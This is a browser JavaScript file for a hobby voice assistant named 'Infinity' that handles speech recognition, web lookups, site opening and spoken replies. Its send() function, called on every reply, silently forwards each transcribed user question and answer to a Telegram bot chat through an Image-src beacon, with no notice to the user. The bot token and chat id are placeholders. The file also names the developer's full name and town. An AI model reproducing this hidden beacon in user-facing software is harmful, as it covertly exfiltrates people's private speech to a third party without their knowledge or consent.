window.SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition
let st = document.querySelector('#st')
let stop = document.querySelector('#stop')
let output = document.querySelector('#xx')
let gola = document.querySelector('.v')
const recon = new SpeechRecognition()
recon.lang = "en-US"
recon.continuous = true;
const token = "API"
const ida = "IDD"
let dab = document.querySelector('#tt')
let memory = {
    name: localStorage.getItem("userName") || null,
};
let isAwake = false


async function send(question, answer) {
    const message = `New Message Update\nQuestion: ${question}\nAnswer: ${answer}`;
    const encodedMessage = encodeURIComponent(message);
    const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${ida}&text=${encodedMessage}`;
    try {
        const img = new Image();
        img.src = telegramUrl;
        console.log("Finally");
    } catch (e) {
        console.log("gjlksjfoisfjosejdo", e);
    }
}
async function infinity2(text) {
    try {
        const res = await fetch(`https://api.duckduckgo.com/?q=${encodeURIComponent(text)}&format=json&no_html=1`)
        const answer = await res.json()

        console.log(answer)
        if (answer.Image) golaimg("https://duckduckgo.com" + answer.Image)
        else golar()
        if (answer.AbstractText) {
            speech(answer.AbstractText)
        }
        else {
            speech("Searching in Google")
            window.open(`https://www.google.com/search?q=${text.replaceAll(" ", "+")}`, "_blank")
        }
    }
    catch (e) {
        speech("Soory Sir Please Net On kriye")
    }
}

function golaimg(url) {
    gola.style.backgroundImage = `url(${url})`
    gola.classList.remove('active')
}

function golar() {
    gola.style.backgroundImage = ""
}

function speech(text) {
    send(output.value, text)
    dab.value = text
    const bolna = new SpeechSynthesisUtterance(text)
    let voices = window.speechSynthesis.getVoices()
    if (voices.length > 0)
        bolna.voice = voices.find(v => v.name.includes("Google UK English Female")) || voices[0]
    bolna.lang = "en-GB"
    bolna.volume = 1
    bolna.rate = 1
    bolna.pitch = 1
    window.speechSynthesis.speak(bolna)
}

function infinity(text) {
    window.speechSynthesis.cancel()
    const command = text.toLowerCase()

    if (command.includes("hello"))
        speech("Hello My Name is Infinty")
    else if (command.includes("open google") || command.includes("open the google")) {
        speech("Google Open SuccessFully")
        window.open("https://www.google.com", "_blank")
    }
    else if (command.includes("open youtube") || command.includes("open the youtube")) {
        speech("Youtube Open Successfully")
        window.open("https://www.youtube.com", "_blank")
    }
    else if (command.includes("search")) {
        const web = command.replace("search ", "").trim()
        speech(`Ok Open The Website ${web}`)
        window.open(`https://www.google.com/search?q=${web.replaceAll(" ", "+")}`, "_blank")
    }
    else if (command.includes("owner") || command.includes("banaya") || command.includes("malik") || command.includes("create") || command.includes("created") || command.includes("god") || command.includes("infinity")) {
        speech("My owner is Bhavesh Sharma Curruntly live in alwar")

    }
    else if (command.includes("my name is")) {

        let name = command.replace("my name is ", "")
        memory.name = name
        localStorage.setItem("userName", name)
        speech(`nice to meet you ${memory.name}`)

    }
    else if (command.includes("what is my name")) {
        speech(`your name is ${memory.name}`)

    }
    else {
        infinity2(command)
    }
}

function chal() {
    window.speechSynthesis.cancel()
    output.value = "Listning.........."
    recon.start()
    gola.classList.add('active')
}

st.addEventListener('click', chal)

stop.addEventListener("click", () => {
    window.speechSynthesis.cancel()
    recon.stop();
    output.value = "Stop Listining"
    speech("Stopped listening");
    gola.classList.remove('active')
});

recon.onstart = () => {
    gola.classList.add('active')
}

recon.onend = () => {
    gola.classList.remove('active')
}

recon.onresult = (event) => {
    let lastIndex = event.results.length - 1
    let command = event.results[lastIndex][0].transcript.toLowerCase()
    output.value = command

    if (!isAwake && command.includes("infinity")) {
        isAwake = true
        speech("I am Listining sir")
        command = command.replace("infinity", "").trim()
        if (command.length > 0) {
            infinity(command)
            isAwake = false
        }
        return
    }
    infinity(command)
    if (!isAwake) return;

    isAwake = false
}